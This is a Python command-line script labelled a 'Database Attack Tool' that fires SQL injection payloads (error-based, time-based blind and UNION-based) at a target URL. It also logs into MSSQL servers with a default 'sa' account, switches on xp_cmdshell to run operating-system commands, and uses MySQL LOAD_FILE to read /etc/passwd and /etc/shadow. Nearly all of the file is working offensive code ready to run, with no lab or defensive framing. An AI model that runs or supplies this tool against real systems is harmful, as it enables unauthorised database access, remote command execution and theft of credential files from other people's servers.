#!/usr/bin/env python3
import requests
import pymssql
import mysql.connector
import argparse
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

class DatabaseAttacks:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()

    def test_sql_injection(self, parameter="id", payloads=None):
        """Test for SQL injection vulnerabilities"""
        print(f"[*] Testing SQL injection on {self.target}")
        
        if not payloads:
            payloads = [
                "'",
                "' OR 1=1 --",
                "' OR '1'='1",
                "' UNION SELECT 1,2,3 --",
                "' AND 1=1 --",
                "' AND 1=2 --",
                "admin'--",
                "admin' #",
                "' OR 1=1#"
            ]
        
        vulnerable = False
        for payload in payloads:
            try:
                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=self.timeout)
                
                # Check for SQL error messages
                error_indicators = [
                    "mysql_fetch_array",
                    "ORA-01756",
                    "Microsoft OLE DB Provider",
                    "SQLServer JDBC Driver",
                    "PostgreSQL query failed",
                    "Warning: mysql_",
                    "MySQLSyntaxErrorException",
                    "valid MySQL result",
                    "check the manual that corresponds to your MySQL server version"
                ]
                
                for indicator in error_indicators:
                    if indicator.lower() in response.text.lower():
                        print(f"[+] VULNERABLE: SQL injection detected")
                        print(f"    Payload: {payload}")
                        print(f"    Error: {indicator}")
                        vulnerable = True
                        break
                
                if vulnerable:
                    break
                    
            except Exception as e:
                print(f"[-] SQL injection test failed: {e}")
        
        if not vulnerable:
            print(f"[-] No SQL injection detected")
        
        return vulnerable

    def test_blind_sql_injection(self, parameter="id"):
        """Test for blind SQL injection using time delays"""
        print(f"[*] Testing blind SQL injection on {self.target}")
        
        time_payloads = [
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' OR pg_sleep(5) --",
            "' AND IF(1=1, SLEEP(5), 0) --"
        ]
        
        for payload in time_payloads:
            try:
                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
                start_time = time.time()
                response = self.session.get(url, timeout=self.timeout)
                end_time = time.time()
                
                if end_time - start_time >= 4:  # Allow some margin
                    print(f"[+] VULNERABLE: Blind SQL injection detected")
                    print(f"    Payload: {payload}")
                    print(f"    Response time: {end_time - start_time:.2f} seconds")
                    return True
                    
            except Exception as e:
                print(f"[-] Blind SQL injection test failed: {e}")
        
        print(f"[-] No blind SQL injection detected")
        return False

    def test_union_sql_injection(self, parameter="id"):
        """Test for UNION-based SQL injection"""
        print(f"[*] Testing UNION SQL injection on {self.target}")
        
        # First, determine number of columns
        columns = self.determine_columns(parameter)
        if not columns:
            print(f"[-] Could not determine column count")
            return False
        
        print(f"[+] Detected {columns} columns")
        
        # Test UNION injection
        union_payloads = [
            f"' UNION SELECT {','.join(['NULL'] * columns)} --",
            f"' UNION SELECT {','.join([str(i) for i in range(1, columns + 1)])} --",
            f"' UNION SELECT database(),user(),version(){',NULL' * (columns - 3)} --" if columns >= 3 else None
        ]
        
        for payload in union_payloads:
            if not payload:
                continue
                
            try:
                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=self.timeout)
                
                # Check for successful UNION
                if response.status_code == 200 and len(response.text) > 100:
                    print(f"[+] POTENTIAL: UNION injection may work")
                    print(f"    Payload: {payload}")
                    
                    # Look for database information
                    if any(db in response.text.lower() for db in ['mysql', 'information_schema', 'root@']):
                        print(f"[+] Database information leaked!")
                        return True
                        
            except Exception as e:
                print(f"[-] UNION SQL injection test failed: {e}")
        
        return False

    def determine_columns(self, parameter):
        """Determine number of columns using ORDER BY"""
        for i in range(1, 21):  # Test up to 20 columns
            try:
                payload = f"' ORDER BY {i} --"
                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=self.timeout)
                
                # Check for error indicating too many columns
                if ("unknown column" in response.text.lower() or 
                    "invalid column" in response.text.lower() or
                    response.status_code == 500):
                    return i - 1
                    
            except Exception as e:
                continue
        
        return None

    def test_mssql_connection(self, host, username, password, database="master"):
        """Test MSSQL connection and execute commands"""
        print(f"[*] Testing MSSQL connection to {host}")
        
        try:
            conn = pymssql.connect(
                server=host,
                user=username,
                password=password,
                database=database,
                timeout=self.timeout
            )
            
            cursor = conn.cursor()
            print(f"[+] Successfully connected to MSSQL server")
            
            # Get version and user info
            queries = [
                ("SELECT @@version", "Version"),
                ("SELECT SYSTEM_USER", "System User"),
                ("SELECT IS_SRVROLEMEMBER('sysadmin')", "Sysadmin Role"),
                ("SELECT name FROM master..sysdatabases", "Databases")
            ]
            
            for query, description in queries:
                try:
                    cursor.execute(query)
                    results = cursor.fetchall()
                    print(f"[+] {description}:")
                    for row in results:
                        print(f"    {row[0]}")
                except Exception as e:
                    print(f"[-] {description} query failed: {e}")
            
            # Test xp_cmdshell
            self.test_xp_cmdshell(cursor)
            
            conn.close()
            return True
            
        except Exception as e:
            print(f"[-] MSSQL connection failed: {e}")
            return False

    def test_xp_cmdshell(self, cursor):
        """Test and enable xp_cmdshell for command execution"""
        print(f"[*] Testing xp_cmdshell")
        
        try:
            # Try to execute a simple command
            cursor.execute("EXEC xp_cmdshell 'whoami'")
            results = cursor.fetchall()
            
            if results and results[0][0]:
                print(f"[+] xp_cmdshell is enabled!")
                print(f"    Result: {results[0][0]}")
                return True
                
        except Exception as e:
            print(f"[-] xp_cmdshell not enabled, attempting to enable...")
            
            # Try to enable xp_cmdshell
            enable_commands = [
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            ]
            
            for cmd in enable_commands:
                try:
                    cursor.execute(cmd)
                    print(f"[+] Executed: {cmd}")
                except Exception as e:
                    print(f"[-] Failed to execute: {cmd} - {e}")
            
            # Test again
            try:
                cursor.execute("EXEC xp_cmdshell 'whoami'")
                results = cursor.fetchall()
                if results and results[0][0]:
                    print(f"[+] xp_cmdshell enabled successfully!")
                    print(f"    Result: {results[0][0]}")
                    return True
            except Exception as e:
                print(f"[-] xp_cmdshell still not working: {e}")
        
        return False

    def test_mysql_connection(self, host, username, password, database="mysql"):
        """Test MySQL connection and enumerate"""
        print(f"[*] Testing MySQL connection to {host}")
        
        try:
            conn = mysql.connector.connect(
                host=host,
                user=username,
                password=password,
                database=database,
                connection_timeout=self.timeout
            )
            
            cursor = conn.cursor()
            print(f"[+] Successfully connected to MySQL server")
            
            # Get version and user info
            queries = [
                ("SELECT VERSION()", "Version"),
                ("SELECT USER()", "Current User"),
                ("SELECT SYSTEM_USER()", "System User"),
                ("SHOW DATABASES", "Databases")
            ]
            
            for query, description in queries:
                try:
                    cursor.execute(query)
                    results = cursor.fetchall()
                    print(f"[+] {description}:")
                    for row in results:
                        print(f"    {row[0]}")
                except Exception as e:
                    print(f"[-] {description} query failed: {e}")
            
            # Try to read sensitive files
            self.test_mysql_file_read(cursor)
            
            conn.close()
            return True
            
        except Exception as e:
            print(f"[-] MySQL connection failed: {e}")
            return False

    def test_mysql_file_read(self, cursor):
        """Test MySQL file reading capabilities"""
        print(f"[*] Testing MySQL file reading")
        
        files_to_read = [
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        for file_path in files_to_read:
            try:
                query = f"SELECT LOAD_FILE('{file_path}')"
                cursor.execute(query)
                result = cursor.fetchone()
                
                if result and result[0]:
                    print(f"[+] Successfully read {file_path}:")
                    print(f"    {result[0][:200]}...")
                    return True
                    
            except Exception as e:
                print(f"[-] Could not read {file_path}: {e}")
        
        print(f"[-] File reading not available")
        return False

def main():
    parser = argparse.ArgumentParser(description="Database Attack Tool")
    parser.add_argument("target", help="Target URL or IP")
    parser.add_argument("--sql-inject", action="store_true", help="Test SQL injection")
    parser.add_argument("--blind-sql", action="store_true", help="Test blind SQL injection")
    parser.add_argument("--union-sql", action="store_true", help="Test UNION SQL injection")
    parser.add_argument("--mssql", action="store_true", help="Test MSSQL connection")
    parser.add_argument("--mysql", action="store_true", help="Test MySQL connection")
    parser.add_argument("--username", default="sa", help="Database username")
    parser.add_argument("--password", default="", help="Database password")
    parser.add_argument("--parameter", default="id", help="Parameter to test for SQL injection")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout")
    
    args = parser.parse_args()
    
    attacker = DatabaseAttacks(args.target, args.timeout)
    
    if args.all or args.sql_inject:
        attacker.test_sql_injection(args.parameter)
        print()
    
    if args.all or args.blind_sql:
        attacker.test_blind_sql_injection(args.parameter)
        print()
    
    if args.all or args.union_sql:
        attacker.test_union_sql_injection(args.parameter)
        print()
    
    if args.mssql:
        attacker.test_mssql_connection(args.target, args.username, args.password)
        print()
    
    if args.mysql:
        attacker.test_mysql_connection(args.target, args.username, args.password)
        print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)